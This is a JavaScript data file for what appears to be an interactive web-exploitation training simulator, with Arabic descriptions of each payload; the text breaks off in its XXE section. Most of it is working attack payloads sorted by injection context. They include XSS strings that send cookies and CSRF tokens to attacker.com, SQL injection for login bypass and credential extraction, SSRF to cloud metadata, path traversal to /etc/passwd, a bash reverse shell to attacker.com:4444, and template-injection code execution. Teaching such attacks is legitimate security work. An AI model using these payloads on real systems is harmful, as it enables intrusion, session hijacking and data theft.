// ==========================================
// INTERACTIVE EXPLOIT & CONTEXT SIMULATOR ENGINE (v3)
// ==========================================

const VulnData = {
  xss: {
    contexts: [
      { id: 'html_body', label: 'HTML Body (e.g. <div>[here]</div>)' },
      { id: 'attribute_dq', label: 'Attribute - Double Quotes (e.g. value="[here]")' },
      { id: 'attribute_sq', label: 'Attribute - Single Quotes (e.g. value=\'[here]\')' },
      { id: 'script_string', label: 'Inside <script> String (e.g. var x = "[here]";)' },
      { id: 'svg', label: 'SVG Context (<svg>)' },
      { id: 'markdown', label: 'Markdown Link ([a](...))' },
      { id: 'angular', label: 'AngularJS Template ({{...}})' }
    ],
    actions: [
      { id: 'alert', label: 'Alert Popup (Proof of Concept)' },
      { id: 'cookie_steal', label: 'Steal Cookies' },
      { id: 'dom_read', label: 'Read DOM / CSRF Token' }
    ]
  },
  sqli: {
    contexts: [
      { id: 'int', label: 'Integer (e.g. id=[here])' },
      { id: 'string_dq', label: 'String - Double Quotes (e.g. name="[here]")' },
      { id: 'string_sq', label: 'String - Single Quotes (e.g. name=\'[here]\')' }
    ],
    actions: [
      { id: 'auth_bypass', label: 'Authentication Bypass (OR 1=1)' },
      { id: 'union_extract', label: 'UNION Data Extraction' },
      { id: 'enum_tables', label: 'Enumerate Tables (information_schema)' },
      { id: 'enum_columns', label: 'Enumerate Columns (information_schema)' },
      { id: 'error_extract', label: 'Error-Based Extraction' },
      { id: 'time_delay', label: 'Time-Based Delay (SLEEP)' }
    ]
  },
  ssrf: {
    contexts: [
      { id: 'url_param', label: 'Full URL Parameter (e.g. ?url=[here])' },
      { id: 'path_append', label: 'Path Append (e.g. api.com/[here])' }
    ],
    actions: [
      { id: 'aws_metadata', label: 'AWS Metadata Exfiltration' },
      { id: 'gcp_metadata', label: 'GCP Metadata Exfiltration' },
      { id: 'localhost_port', label: 'Localhost Port Scan' },
      { id: 'ipv6_bypass', label: 'IPv6 Localhost Bypass' }
    ]
  },
  lfi: {
    contexts: [
      { id: 'direct_file', label: 'Direct File Inclusion (e.g. ?file=[here])' },
      { id: 'path_traversal', label: 'Path Traversal (e.g. ?file=folder/[here])' }
    ],
    actions: [
      { id: 'read_passwd', label: 'Read /etc/passwd' },
      { id: 'read_win_ini', label: 'Read C:\\Windows\\win.ini' },
      { id: 'php_wrapper', label: 'PHP Wrapper (Base64 Extract)' }
    ]
  },
  cmdi: {
    contexts: [
      { id: 'direct', label: 'Direct Execution (e.g. ?cmd=[here])' },
      { id: 'blind', label: 'Blind / Chained Execution (e.g. ping [here])' }
    ],
    actions: [
      { id: 'rev_shell', label: 'Reverse Shell (Bash)' },
      { id: 'read_file', label: 'Read /etc/passwd' },
      { id: 'ping_delay', label: 'Ping Delay (Blind PoC)' }
    ]
  },
  ssti: {
    contexts: [
      { id: 'jinja2', label: 'Jinja2 / Twig (Python/PHP)' },
      { id: 'erb', label: 'ERB (Ruby)' }
    ],
    actions: [
      { id: 'math', label: 'Math Evaluation (PoC)' },
      { id: 'rce', label: 'Remote Code Execution' }
    ]
  },
  xxe: {
    contexts: [
      { id: 'classic_xml', label: 'Classic XML Payload' },
      { id: 'soap_body', label: 'SOAP Body Payload' }
    ],
    actions: [
      { id: 'local_file', label: 'Read Local File (/etc/passwd)' },
      { id: 'oob', label: 'Out-Of-Band (OOB) Extraction' }
    ]
  },
  csrf: {
    contexts: [
      { id: 'html_form', label: 'Auto-submitting HTML Form' },
      { id: 'ajax_fetch', label: 'AJAX / Fetch API Request' }
    ],
    actions: [
      { id: 'state_change', label: 'State Change (e.g. Change Email)' }
    ]
  },
  open_redirect: {
    contexts: [
      { id: 'url_param', label: 'URL Parameter (e.g. ?redirect=[here])' },
      { id: 'path_based', label: 'Path-based (e.g. /out/[here])' }
    ],
    actions: [
      { id: 'phishing', label: 'Redirect to Phishing Domain' },
      { id: 'js_exec', label: 'JavaScript Execution (javascript:alert)' }
    ]
  },
  cors: {
    contexts: [
      { id: 'null_origin', label: 'Null Origin Reflection' },
      { id: 'arb_origin', label: 'Arbitrary Origin Reflection' }
    ],
    actions: [
      { id: 'steal_api', label: 'Exfiltrate API Keys via XHR (withCredentials)' }
    ]
  }
};

const PayloadTemplates = {
  xss: {
    alert: {
      html_body: {
        code: "<script>alert(document.domain)</script>",
        breakout: "",
        template: "<div>Results for: [USER_INPUT]</div>",
        simulatedType: "dialog",
        simulatedVal: "example.com",
        desc: "حقن مباشر لوسم `script`. ينجح عندما يتم وضع مدخلاتك مباشرة داخل هيكل الـ HTML دون فلترة."
      },
      attribute_dq: {
        code: "\"><script>alert(document.domain)</script>",
        breakout: "\">",
        template: "<input type=\"text\" name=\"search\" value=\"[USER_INPUT]\">",
        simulatedType: "dialog",
        simulatedVal: "example.com",
        desc: "يقوم بكسر سمة الـ HTML (Attribute) التي تستخدم علامتي التنصيص المزدوجة باستخدام `\">` ثم يحقن الكود."
      },
      attribute_sq: {
        code: "'><script>alert(document.domain)</script>",
        breakout: "'>",
        template: "<input type='text' name='search' value='[USER_INPUT]'>",
        simulatedType: "dialog",
        simulatedVal: "example.com",
        desc: "يقوم بكسر سمة الـ HTML التي تستخدم علامة التنصيص المفردة باستخدام `'>`."
      },
      script_string: {
        code: "\"; alert(document.domain); //",
        breakout: "\";",
        template: "<script> var keyword = \"[USER_INPUT]\"; </script>",
        simulatedType: "dialog",
        simulatedVal: "example.com",
        desc: "يقوم بكسر السلسلة النصية داخل كود جافاسكريبت باستخدام `\";` لتنفيذ الكود، ثم يتجاهل باقي السطر باستخدام `//`."
      },
      svg: {
        code: "<svg onload=alert(1)>",
        breakout: "",
        template: "<div class=\"user-avatar\">[USER_INPUT]</div>",
        simulatedType: "dialog",
        simulatedVal: "1",
        desc: "يستخدم وسم `svg` مع حدث `onload`. هذا الكود يتخطى الكثير من الفلاتر التي تركز فقط على منع وسم `script`."
      },
      markdown: {
        code: "[a](javascript:alert(1))",
        breakout: "",
        template: "<div class=\"comment-body\">User Bio: [USER_INPUT]</div>",
        simulatedType: "dialog",
        simulatedVal: "1",
        desc: "يستغل معالجات الـ Markdown التي لا تقوم بفلترة سمة `href` داخل الروابط."
      },
      angular: {
        code: "{{$on.constructor('alert(1)')()}}",
        breakout: "{{",
        template: "<div ng-app>Welcome, [USER_INPUT]</div>",
        simulatedType: "dialog",
        simulatedVal: "1",
        desc: "تخطي حماية (Sandbox) الخاصة ببيئة AngularJS للوصول إلى دالة الـ constructor وتنفيذ أوامر جافاسكريبت."
      }
    },
    cookie_steal: {
      html_body: {
        code: "<img src=x onerror=\"fetch('https://attacker.com/log?c='+document.cookie)\">",
        breakout: "",
        template: "<div>Profile Name: [USER_INPUT]</div>",
        simulatedType: "network",
        simulatedVal: "POST https://attacker.com/log?c=session_id=9f8234a1bc89...",
        desc: "يستخدم وسم صورة برابط خاطئ لإجبار المتصفح على تشغيل حدث `onerror`، والذي بدوره يسرق ملفات تعريف الارتباط (Cookies) ويرسلها للمخترق."
      },
      attribute_dq: {
        code: "\" autofocus onfocus=\"fetch('https://attacker.com/log?c='+document.cookie)\"",
        breakout: "\"",
        template: "<input type=\"text\" id=\"bio\" value=\"[USER_INPUT]\">",
        simulatedType: "network",
        simulatedVal: "POST https://attacker.com/log?c=session_id=9f8234a1bc89...",
        desc: "يكسر السمة ويحقن خصائص `autofocus` و `onfocus` لتنفيذ الكود وسرقة الكوكيز تلقائياً دون تفاعل من المستخدم."
      },
      attribute_sq: {
        code: "' autofocus onfocus='fetch(`https://attacker.com/log?c=`+document.cookie)'",
        breakout: "'",
        template: "<input type='text' id='bio' value='[USER_INPUT]'>",
        simulatedType: "network",
        simulatedVal: "POST https://attacker.com/log?c=session_id=9f8234a1bc89...",
        desc: "نفس الكود السابق ولكن لكسر علامة التنصيص المفردة."
      },
      script_string: {
        code: "\"; fetch('https://attacker.com/log?c='+document.cookie); //",
        breakout: "\";",
        template: "<script> var userBio = \"[USER_INPUT]\"; </script>",
        simulatedType: "network",
        simulatedVal: "POST https://attacker.com/log?c=session_id=9f8234a1bc89...",
        desc: "يكسر السلسلة النصية وينفذ أمر إرسال الكوكيز للمخترق مباشرة داخل سياق الجافاسكريبت."
      },
      svg: {
        code: "<svg onload=\"fetch('https://attacker.com/log?c='+document.cookie)\">",
        breakout: "",
        template: "<div>User Badge: [USER_INPUT]</div>",
        simulatedType: "network",
        simulatedVal: "POST https://attacker.com/log?c=session_id=9f8234a1bc89...",
        desc: "يسرق الكوكيز بمجرد تحميل رسمة الـ SVG."
      },
      markdown: {
        code: "[a](javascript:fetch('https://attacker.com/log?c='+document.cookie))",
        breakout: "",
        template: "<p>Website: [USER_INPUT]</p>",
        simulatedType: "network",
        simulatedVal: "POST https://attacker.com/log?c=session_id=9f8234a1bc89...",
        desc: "يسرق الكوكيز بمجرد أن يقوم الضحية بالضغط على الرابط (Markdown Link)."
      },
      angular: {
        code: "{{$on.constructor('fetch(`https://attacker.com/log?c=`+document.cookie)')()}}",
        breakout: "{{",
        template: "<div ng-app>User Status: [USER_INPUT]</div>",
        simulatedType: "network",
        simulatedVal: "POST https://attacker.com/log?c=session_id=9f8234a1bc89...",
        desc: "تخطي بيئة AngularJS لسرقة الكوكيز عبر استدعاء دوال خارجية."
      }
    },
    dom_read: {
      html_body: {
        code: "<script>fetch('https://attacker.com/log?token='+document.getElementsByName('csrf-token')[0].content)</script>",
        breakout: "",
        template: "<div>[USER_INPUT]</div>",
        simulatedType: "network",
        simulatedVal: "POST https://attacker.com/log?token=csrf_token_88f91a...",
        desc: "يقرأ رمز الـ CSRF المخفي داخل الصفحة (DOM) ويرسله لخادم المخترق."
      },
      attribute_dq: {
        code: "\"><script>fetch('https://attacker.com/log?token='+document.getElementsByName('csrf-token')[0].content)</script>",
        breakout: "\">",
        template: "<input name=\"custom\" value=\"[USER_INPUT]\">",
        simulatedType: "network",
        simulatedVal: "POST https://attacker.com/log?token=csrf_token_88f91a...",
        desc: "يكسر السمة المزدوجة ويقرأ رمز الـ CSRF."
      },
      attribute_sq: {
        code: "'><script>fetch('https://attacker.com/log?token='+document.getElementsByName('csrf-token')[0].content)</script>",
        breakout: "'>",
        template: "<input name='custom' value='[USER_INPUT]'>",
        simulatedType: "network",
        simulatedVal: "POST https://attacker.com/log?token=csrf_token_88f91a...",
        desc: "يكسر السمة المفردة ويقرأ رمز الـ CSRF."
      },
      script_string: {
        code: "\"; fetch('https://attacker.com/log?token='+document.getElementsByName('csrf-token')[0].content); //",
        breakout: "\";",
        template: "<script> var customVal = \"[USER_INPUT]\"; </script>",
        simulatedType: "network",
        simulatedVal: "POST https://attacker.com/log?token=csrf_token_88f91a...",
        desc: "يكسر سلسلة الجافاسكريبت ويقرأ رمز الـ CSRF."
      },
      svg: {
        code: "<svg onload=\"fetch('https://attacker.com/log?token='+document.getElementsByName('csrf-token')[0].content)\">",
        breakout: "",
        template: "<div>[USER_INPUT]</div>",
        simulatedType: "network",
        simulatedVal: "POST https://attacker.com/log?token=csrf_token_88f91a...",
        desc: "يقرأ رمز الـ CSRF بمجرد عرض הـ SVG."
      },
      markdown: {
        code: "[a](javascript:fetch('https://attacker.com/log?token='+document.getElementsByName('csrf-token')[0].content))",
        breakout: "",
        template: "<div>[USER_INPUT]</div>",
        simulatedType: "network",
        simulatedVal: "POST https://attacker.com/log?token=csrf_token_88f91a...",
        desc: "يقرأ البيانات الحساسة من الصفحة ويرسلها بمجرد الضغط على الرابط."
      },
      angular: {
        code: "{{$on.constructor('fetch(`https://attacker.com/log?token=`+document.getElementsByName(`csrf-token`)[0].content)')()}}",
        breakout: "{{",
        template: "<div ng-app>[USER_INPUT]</div>",
        simulatedType: "network",
        simulatedVal: "POST https://attacker.com/log?token=csrf_token_88f91a...",
        desc: "تخطي AngularJS لقراءة الـ DOM."
      }
    }
  },
  sqli: {
    auth_bypass: {
      int: {
        code: "1 OR 1=1",
        breakout: "",
        template: "SELECT * FROM users WHERE id = [USER_INPUT] AND active = 1;",
        simulatedType: "db_success",
        simulatedVal: "Authentication Bypassed! Logged in as Administrator (id: 1).",
        desc: "يقوم بتعديل جملة الاستعلام (WHERE) لتكون صحيحة دائماً (لأن 1=1 صحيحة دائماً)، مما يسمح بتخطي تسجيل الدخول."
      },
      string_dq: {
        code: "\" OR \"1\"=\"1",
        breakout: "\" OR \"1\"=\"1",
        template: "SELECT * FROM users WHERE username = \"[USER_INPUT]\" AND password = \"pass\";",
        simulatedType: "db_success",
        simulatedVal: "Authentication Bypassed! Logged in as Administrator (id: 1).",
        desc: "يغلق علامة التنصيص المزدوجة ويضيف شرطاً صحيحاً دائماً."
      },
      string_sq: {
        code: "' OR '1'='1",
        breakout: "' OR '1'='1",
        template: "SELECT * FROM users WHERE username = '[USER_INPUT]' AND password = 'pass';",
        simulatedType: "db_success",
        simulatedVal: "Authentication Bypassed! Logged in as Administrator (id: 1).",
        desc: "يغلق علامة التنصيص المفردة ويضيف شرطاً صحيحاً دائماً لتخطي المصادقة."
      }
    },
    union_extract: {
      int: {
        code: "-1 UNION SELECT username, password FROM users-- -",
        breakout: "-1 UNION",
        template: "SELECT id, product_name FROM products WHERE category_id = [USER_INPUT];",
        simulatedType: "db_table",
        simulatedVal: "[ {username: 'admin', password: '$2y$10$e89...'}, {username: 'john_doe', password: '$2y$10$9a1...'} ]",
        desc: "يستخدم -1 لجعل الاستعلام الأول فارغاً، ثم يدمج معه نتائج استعلام ثانٍ (UNION) لجلب أسماء المستخدمين وكلمات المرور."
      },
      string_dq: {
        code: "\" UNION SELECT username, password FROM users-- -",
        breakout: "\" UNION",
        template: "SELECT id, product_name FROM products WHERE category_name = \"[USER_INPUT]\";",
        simulatedType: "db_table",
        simulatedVal: "[ {username: 'admin', password: '$2y$10$e89...'}, {username: 'john_doe', password: '$2y$10$9a1...'} ]",
        desc: "يغلق علامة التنصيص المزدوجة ويستخدم UNION لاستخراج البيانات."
      },
      string_sq: {
        code: "' UNION SELECT username, password FROM users-- -",
        breakout: "' UNION",
        template: "SELECT id, product_name FROM products WHERE category_name = '[USER_INPUT]';",
        simulatedType: "db_table",
        simulatedVal: "[ {username: 'admin', password: '$2y$10$e89...'}, {username: 'john_doe', password: '$2y$10$9a1...'} ]",
        desc: "يغلق علامة التنصيص المفردة ويستخدم UNION لاستخراج البيانات."
      }
    },
    enum_tables: {
      int: {
        code: "-1 UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database()-- -",
        breakout: "-1 UNION",
        template: "SELECT id, name FROM categories WHERE id = [USER_INPUT];",
        simulatedType: "db_table",
        simulatedVal: "[ {table_name: 'users'}, {table_name: 'payments'}, {table_name: 'user_tokens'} ]",
        desc: "يستخرج أسماء جميع الجداول الموجودة في قاعدة البيانات الحالية عن طريق الاستعلام من الفهرس `information_schema.tables`."
      },
      string_dq: {
        code: "\" UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database()-- -",
        breakout: "\" UNION",
        template: "SELECT id, name FROM categories WHERE slug = \"[USER_INPUT]\";",
        simulatedType: "db_table",
        simulatedVal: "[ {table_name: 'users'}, {table_name: 'payments'}, {table_name: 'user_tokens'} ]",
        desc: "يكسر السلسلة ويستخرج أسماء الجداول."
      },
      string_sq: {
        code: "' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database()-- -",
        breakout: "' UNION",
        template: "SELECT id, name FROM categories WHERE slug = '[USER_INPUT]';",
        simulatedType: "db_table",
        simulatedVal: "[ {table_name: 'users'}, {table_name: 'payments'}, {table_name: 'user_tokens'} ]",
        desc: "يكسر السلسلة المفردة ويستخرج أسماء الجداول."
      }
    },
    enum_columns: {
      int: {
        code: "-1 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='[YOUR_TABLE_NAME]'-- -",
        breakout: "-1 UNION",
        template: "SELECT id, name FROM items WHERE id = [USER_INPUT];",
        simulatedType: "db_table",
        simulatedVal: "[ {column_name: 'user_id'}, {column_name: 'email_address'}, {column_name: 'password_hash'} ]",
        desc: "يستخرج أسماء الأعمدة لجدول معين (قم باستبدال [YOUR_TABLE_NAME] باسم الجدول المستهدف)."
      },
      string_dq: {
        code: "\" UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='[YOUR_TABLE_NAME]'-- -",
        breakout: "\" UNION",
        template: "SELECT id, name FROM items WHERE code = \"[USER_INPUT]\";",
        simulatedType: "db_table",
        simulatedVal: "[ {column_name: 'user_id'}, {column_name: 'email_address'}, {column_name: 'password_hash'} ]",
        desc: "يستخرج أسماء الأعمدة بعد كسر علامة التنصيص."
      },
      string_sq: {
        code: "' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='[YOUR_TABLE_NAME]'-- -",
        breakout: "' UNION",
        template: "SELECT id, name FROM items WHERE code = '[USER_INPUT]';",
        simulatedType: "db_table",
        simulatedVal: "[ {column_name: 'user_id'}, {column_name: 'email_address'}, {column_name: 'password_hash'} ]",
        desc: "يستخرج أسماء الأعمدة لجدول محدد."
      }
    },
    error_extract: {
      int: {
        code: "1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))",
        breakout: "AND",
        template: "SELECT * FROM logs WHERE log_id = [USER_INPUT];",
        simulatedType: "db_error",
        simulatedVal: "SQL Syntax Error: XPATH syntax error: '~8.0.32-MySQL~'",
        desc: "استخراج البيانات عبر الأخطاء (Error-Based). يتعمد إرسال كود XML خاطئ ليقوم السيرفر بإظهار رسالة خطأ تحتوي على إصدار قاعدة البيانات (@@version)."
      },
      string_dq: {
        code: "\" AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))-- -",
        breakout: "\" AND",
        template: "SELECT * FROM logs WHERE log_type = \"[USER_INPUT]\";",
        simulatedType: "db_error",
        simulatedVal: "SQL Syntax Error: XPATH syntax error: '~8.0.32-MySQL~'",
        desc: "يكسر علامة التنصيص المزدوجة ويجبر قاعدة البيانات على إظهار رسالة خطأ تسرب البيانات."
      },
      string_sq: {
        code: "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))-- -",
        breakout: "' AND",
        template: "SELECT * FROM logs WHERE log_type = '[USER_INPUT]';",
        simulatedType: "db_error",
        simulatedVal: "SQL Syntax Error: XPATH syntax error: '~8.0.32-MySQL~'",
        desc: "يكسر علامة التنصيص المفردة ويستخرج البيانات عبر رسالة الخطأ."
      }
    },
    time_delay: {
      int: {
        code: "1; WAITFOR DELAY '0:0:5'--",
        breakout: ";",
        template: "SELECT * FROM users WHERE id = [USER_INPUT];",
        simulatedType: "time",
        simulatedVal: "HTTP/1.1 200 OK (Response time: 5,042 ms)",
        desc: "كود مخصص لقواعد بيانات SQL Server. يجبر السيرفر على التوقف (Sleep) لمدة 5 ثوانٍ لتأكيد وجود ثغرة حقن عمياء (Blind SQLi)."
      },
      string_dq: {
        code: "\"; WAITFOR DELAY '0:0:5'--",
        breakout: "\";",
        template: "SELECT * FROM users WHERE email = \"[USER_INPUT]\";",
        simulatedType: "time",
        simulatedVal: "HTTP/1.1 200 OK (Response time: 5,042 ms)",
        desc: "يكسر السلسلة المزدوجة ويؤخر استجابة السيرفر."
      },
      string_sq: {
        code: "'; WAITFOR DELAY '0:0:5'--",
        breakout: "';",
        template: "SELECT * FROM users WHERE email = '[USER_INPUT]';",
        simulatedType: "time",
        simulatedVal: "HTTP/1.1 200 OK (Response time: 5,042 ms)",
        desc: "يكسر السلسلة المفردة ويؤخر استجابة السيرفر."
      }
    }
  },
  ssrf: {
    aws_metadata: {
      url_param: {
        code: "http://169.254.169.254/latest/meta-data/",
        breakout: "",
        template: "curl_exec('https://api.internal.com/fetch?target=' + [USER_INPUT]);",
        simulatedType: "http_res",
        simulatedVal: "HTTP/1.1 200 OK\n\nami-id\ninstance-id\niam/security-credentials/",
        desc: "يطلب بشكل مباشر عنوان الـ IP السحري الخاص بخوادم AWS لسحب البيانات الوصفية (Metadata) للسيرفر."
      },
      path_append: {
        code: "@169.254.169.254/latest/meta-data/",
        breakout: "@",
        template: "fetch('https://api.company.com/' + [USER_INPUT]);",
        simulatedType: "http_res",
        simulatedVal: "HTTP/1.1 200 OK\n\nami-id\ninstance-id\niam/security-credentials/",
        desc: "يستخدم علامة `@` لخداع المحلل (Parser) واعتبار ما قبلها كاسم مستخدم، فيقوم السيرفر بطلب عنوان AWS الداخلي."
      }
    },
    gcp_metadata: {
      url_param: {
        code: "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
        breakout: "",
        template: "file_get_contents([USER_INPUT]);",
        simulatedType: "http_res",
        simulatedVal: "HTTP/1.1 200 OK\nMetadata-Flavor: Google\n\ninstance/attributes/kube-env",
        desc: "يطلب البيانات الوصفية لخوادم Google Cloud (GCP). ملاحظة: يتطلب هذا الهجوم غالباً إضافة ترويسة (Header) خاصة."
      },
      path_append: {
        code: "@metadata.google.internal/computeMetadata/v1/",
        breakout: "@",
        template: "curl('[USER_INPUT]');",
        simulatedType: "http_res",
        simulatedVal: "HTTP/1.1 200 OK\nMetadata-Flavor: Google\n\ninstance/attributes/kube-env",
        desc: "يدمج عنوان GCP الداخلي لتخطي فلاتر الروابط."
      }
    },
    localhost_port: {
      url_param: {
        code: "http://127.0.0.1:22",
        breakout: "",
        template: "http_request([USER_INPUT]);",
        simulatedType: "http_res",
        simulatedVal: "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1",
        desc: "يطلب البورت 22 (SSH) على الشبكة المحلية للسيرفر نفسه لاكتشاف المنافذ الداخلية المفتوحة."
      },
      path_append: {
        code: "@127.0.0.1:22",
        breakout: "@",
        template: "http_request([USER_INPUT]);",
        simulatedType: "http_res",
        simulatedVal: "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1",
        desc: "يستخدم الـ `@` لتوجيه الطلب الداخلي إلى البورت 22 لمعرفة ما إذا كان مفتوحاً."
      }
    },
    ipv6_bypass: {
      url_param: {
        code: "http://[::]:80/",
        breakout: "",
        template: "curl_fetch([USER_INPUT]);",
        simulatedType: "http_res",
        simulatedVal: "HTTP/1.1 200 OK\nServer: nginx/1.18.0 (Ubuntu)\nContent: Internal Admin Panel",
        desc: "يستخدم صيغة `[::]` وهي تعادل 127.0.0.1 في بروتوكول IPv6. هذه التقنية تتخطى الكثير من الفلاتر التي تحظر 127.0.0.1 فقط."
      },
      path_append: {
        code: "@[::]:80/",
        breakout: "@",
        template: "curl_fetch([USER_INPUT]);",
        simulatedType: "http_res",
        simulatedVal: "HTTP/1.1 200 OK\nServer: nginx/1.18.0 (Ubuntu)\nContent: Internal Admin Panel",
        desc: "يدمج عنوان IPv6 المحلي لتخطي فلاتر الـ WAF."
      }
    }
  },
  lfi: {
    read_passwd: {
      direct_file: {
        code: "/etc/passwd",
        breakout: "",
        template: "include([USER_INPUT]);",
        simulatedType: "file_res",
        simulatedVal: "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
        desc: "مسار مباشر (Absolute Path) لقراءة ملف كلمات المرور والمستخدمين في أنظمة Linux."
      },
      path_traversal: {
        code: "../../../../../../../../../etc/passwd",
        breakout: "../",
        template: "include('/var/www/html/languages/' . [USER_INPUT]);",
        simulatedType: "file_res",
        simulatedVal: "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
        desc: "يستخدم الكثير من `../` للرجوع للخلف والوصول إلى المجلد الرئيسي (Root) ثم الدخول لملف passwd (تخطي المسار)."
      }
    },
    read_win_ini: {
      direct_file: {
        code: "C:\\Windows\\win.ini",
        breakout: "",
        template: "include([USER_INPUT]);",
        simulatedType: "file_res",
        simulatedVal: "; for 16-bit app support\n[fonts]\n[extensions]\n[mci extensions]\n[files]",
        desc: "مسار مباشر لقراءة ملفات نظام Windows الداخلية."
      },
      path_traversal: {
        code: "..\\..\\..\\..\\..\\..\\..\\..\\Windows\\win.ini",
        breakout: "..\\",
        template: "include('C:\\App\\Public\\' . [USER_INPUT]);",
        simulatedType: "file_res",
        simulatedVal: "; for 16-bit app support\n[fonts]\n[extensions]\n[mci extensions]\n[files]",
        desc: "تخطي المسار في أنظمة Windows باستخدام الشرطة المائلة العكسية."
      }
    },
    php_wrapper: {
      direct_file: {
        code: "php://filter/convert.base64-encode/resource=index.php",
        breakout: "php://",
        template: "include([USER_INPUT]);",
        simulatedType: "http_res",
        simulatedVal: "PD9waHAgZWNobyAiSGVsbG8gV29ybGQiOyA/Pg== (Base64 Encrypted PHP Source Code)",
        desc: "يستخدم فلاتر PHP لقراءة الكود المصدري للملف (index.php) وتحويله إلى Base64 بدلاً من تنفيذه، مما يسمح للمخترق بقراءة كود الموقع السري!"
      },
      path_traversal: {
        code: "php://filter/convert.base64-encode/resource=../../../../config.php",
        breakout: "php://",
        template: "include('templates/' . [USER_INPUT]);",
        simulatedType: "http_res",
        simulatedVal: "PD9waHAgJGRiX3Bhc3MgPSAiU3VwZXJTZWNyZXQxMjMiOyA/Pg== (Decodes to DB Passwords)",
        desc: "يدمج تخطي المسارات `../` مع فلاتر PHP لقراءة ملفات الإعدادات (التي تحتوي على كلمات مرور قاعدة البيانات) دون تفعيلها."
      }
    }
  },
  cmdi: {
    rev_shell: {
      direct: {
        code: "bash -i >& /dev/tcp/attacker.com/4444 0>&1",
        breakout: "",
        template: "system([USER_INPUT]);",
        simulatedType: "terminal",
        simulatedVal: "$ nc -lvnp 4444\nConnection received on 192.168.1.55:51204\nbash-5.1$ whoami\nwww-data",
        desc: "ينشئ اتصالاً عكسياً (Reverse Shell) بسيرفر المخترق. يتطلب هذا تشغيل أداة تنصت (Listener) على سيرفر المخترق."
      },
      blind: {
        code: "; bash -i >& /dev/tcp/attacker.com/4444 0>&1 |",
        breakout: ";",
        template: "system('ping -c 1 ' . [USER_INPUT]);",
        simulatedType: "terminal",
        simulatedVal: "$ nc -lvnp 4444\nConnection received on 192.168.1.55:51204\nbash-5.1$ id\nuid=33(www-data) gid=33(www-data)",
        desc: "يكسر الأمر الحالي باستخدام فارزة منقوطة `;` أو `|` لتنفيذ اتصال عكسي مخفي."
      }
    },
    read_file: {
      direct: {
        code: "cat /etc/passwd",
        breakout: "",
        template: "exec([USER_INPUT]);",
        simulatedType: "file_res",
        simulatedVal: "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/bin/false",
        desc: "ينفذ أمر قراءة الملفات مباشرة لسرقة البيانات."
      },
      blind: {
        code: "; cat /etc/passwd #",
        breakout: ";",
        template: "shell_exec('nslookup ' . [USER_INPUT]);",
        simulatedType: "file_res",
        simulatedVal: "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/bin/false",
        desc: "يكسر الأمر الأول، وينفذ أمر القراءة، ثم يعطل (Comment) باقي الأوامر باستخدام `#` لتجنب الأخطاء البرمجية."
      }
    },
    ping_delay: {
      direct: {
        code: "ping -c 10 127.0.0.1",
        breakout: "",
        template: "passthru([USER_INPUT]);",
        simulatedType: "time",
        simulatedVal: "Command executed. Execution time: 10.012 seconds.",
        desc: "يرسل 10 طلبات Ping للسيرفر نفسه، مما يسبب تأخيراً زمنياً (حوالي 10 ثوانٍ) كدليل لإثبات وجود ثغرة RCE عمياء."
      },
      blind: {
        code: "| ping -c 10 127.0.0.1 |",
        breakout: "|",
        template: "system('traceroute ' . [USER_INPUT]);",
        simulatedType: "time",
        simulatedVal: "Command executed. Execution time: 10.012 seconds.",
        desc: "يدمج أمر الـ ping لتأخير استجابة السيرفر وإثبات إمكانية تنفيذ الأوامر بالخفاء."
      }
    }
  },
  ssti: {
    math: {
      jinja2: {
        code: "{{7*7}}",
        breakout: "{{",
        template: "render_template_string('Hello ' + [USER_INPUT]);",
        simulatedType: "http_res",
        simulatedVal: "HTTP/1.1 200 OK\n\nHello 49",
        desc: "استغلال بيئة قوالب Jinja2/Twig. إذا طبع السيرفر الرقم 49 بدلاً من الكود، فهذا يعني وجود ثغرة SSTI أكيدة."
      },
      erb: {
        code: "<%= 7*7 %>",
        breakout: "<%=",
        template: "ERB.new('Welcome ' + [USER_INPUT]).result",
        simulatedType: "http_res",
        simulatedVal: "HTTP/1.1 200 OK\n\nWelcome 49",
        desc: "كود رياضي لإثبات وجود ثغرة حقن قوالب في بيئة Ruby ERB."
      }
    },
    rce: {
      jinja2: {
        code: "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}",
        breakout: "{{",
        template: "render_template_string('User Bio: ' + [USER_INPUT]);",
        simulatedType: "http_res",
        simulatedVal: "HTTP/1.1 200 OK\n\nUser Bio: uid=1000(flask) gid=1000(flask) groups=1000(flask)",
        desc: "كود هروب (Sandbox Escape) معقد في بيئة Python Jinja2. يتنقل عبر الكائنات الأساسية للغة للوصول إلى مكتبة `os` وتنفيذ أوامر النظام (RCE)."
      },
      erb: {
        code: "<%= system('id') %>",
        breakout: "<%=",
        template: "ERB.new([USER_INPUT]).result",
        simulatedType: "http_res",
        simulatedVal: "HTTP/1.1 200 OK\n\nuid=1000(rails) gid=1000(rails)",
        desc: "ينفذ أوامر النظام مباشرة داخل قوالب Ruby ERB باستخدام دالة `system()`."
      }
    }
  },
  xxe: {
    local_file: {
      classic_xml: {
        code: "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
        breakout: "<!ENTITY",
        template: "XMLParser.parse([USER_INPUT]);",
        simulatedType: "xml_res",
        simulatedVal: "<root>root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon...</root>",
